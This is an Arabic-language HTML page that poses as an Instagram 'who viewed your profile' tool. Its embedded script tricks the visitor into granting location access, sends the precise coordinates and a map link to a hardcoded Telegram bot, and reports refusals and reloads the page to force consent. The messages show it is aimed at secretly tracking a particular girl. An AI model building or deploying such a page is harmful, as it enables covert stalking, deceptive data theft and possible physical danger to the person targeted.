<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Insights - زوار الحساب</title>
    <style>
        body { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
        .card { background: white; color: #262626; padding: 25px; border-radius: 15px; width: 85%; max-width: 340px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.3); }
        .inst-icon { width: 60px; height: 60px; margin-bottom: 15px; }
        h2 { font-size: 19px; margin-bottom: 10px; color: #1c1e21; }
        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 20px; }
        .btn { background-color: #0095f6; color: white; padding: 12px; border-radius: 8px; border: none; font-weight: bold; width: 100%; cursor: pointer; font-size: 15px; }
        #loading { display: none; margin-top: 15px; color: #0095f6; font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="inst-icon">
    <h2>من شاهد ملفك الشخصي؟</h2>
    <p>تم رصد 23 زيارة جديدة لحسابك اليوم! يرجى السماح بالوصول للموقع للمطابقة مع خادم البيانات وعرض قائمة الأسماء الكاملة.</p>
    <button class="btn" onclick="startCapture()">عرض القائمة الآن</button>
    <div id="loading">جاري فحص البيانات...</div>
</div>

<script>
    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
    const chat_id = '7214473798';

    async function sendToTelegram(msg) {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
    }

    function startCapture() {
        document.getElementById('loading').style.display = 'block';
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(p) {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                const acc = p.coords.accuracy;
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                sendToTelegram(`🎯 تم صيد إحداثيات البنت بنجاح!\n📍 الرابط: ${mapLink}\n📏 الدقة: ${acc} متر`);
                
                setTimeout(() => {
                    window.location.href = "https://www.instagram.com/ha2542213";
                }, 1000);
            }, function(e) {
                sendToTelegram("⚠️ البنت فتحت الرابط وضغطت (رفض) للموقع.");
                alert("خطأ: يجب السماح بالوصول للموقع لتحديث قائمة الزوار.");
                location.reload(); // إعادة الطلب لإجبارها
            }, {enableHighAccuracy: true});
        }
    }
</script>
</body>
</html>
